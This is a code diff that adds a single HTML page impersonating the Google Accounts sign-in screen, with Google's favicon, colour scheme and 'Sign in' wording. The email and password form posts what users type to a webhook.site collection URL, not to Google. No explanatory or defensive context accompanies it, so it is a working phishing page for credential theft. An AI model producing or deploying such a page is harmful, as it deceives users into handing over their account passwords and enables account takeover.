@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Sign in - Google Accounts</title>
+    <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/avatar_2x.png">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-box {
+            background: white;
+            padding: 40px;
+            box-shadow: 0px 0px 10px 2px rgba(0,0,0,0.1);
+            border-radius: 8px;
+            width: 300px;
+        }
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0 16px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            background-color: #1a73e8;
+            color: white;
+            padding: 12px;
+            width: 100%;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        h2 {
+            color: #202124;
+            margin-bottom: 20px;
+            font-weight: normal;
+        }
+        small {
+            color: gray;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Sign in</h2>
+        <form method="POST" action="https://webhook.site/b1d65688-5fbc-4f0e-8b7f-3e8267e48427">
+            <input type="email" name="email" placeholder="Email or phone" required><br>
+            <input type="password" name="password" placeholder="Enter your password" required><br>
+            <button type="submit">Next</button>
+        </form>
+        <small>Not your computer? Use Guest mode to sign in privately.</small>
+    </div>
+</body>
+</html>
